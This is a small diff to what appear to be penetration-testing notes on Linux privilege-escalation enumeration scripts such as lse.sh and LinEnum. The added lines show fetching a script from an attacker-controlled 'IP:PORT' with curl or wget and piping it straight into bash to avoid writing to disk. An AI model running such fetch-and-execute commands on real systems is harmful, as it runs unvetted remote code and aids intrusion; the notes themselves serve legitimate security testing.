@@ -12,11 +12,17 @@
 # 1. LSE
 wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;chmod 700 lse.sh
 # Show interesting results.
-./lse.sh -l 1
+./lse.sh -l1
 
 
 ./LinEnum.sh
+```
 
+It is also possible to invoke those script without writing them on the host with either curl or wget.
+
+```bash
+curl IP:PORT/scrip.sh | bash
+wget -O - IP:PORT/scrip.sh | bash
 ```
 
 *Note that I didn't include "unix-privesc-check" has it has not been updated since 3 years*
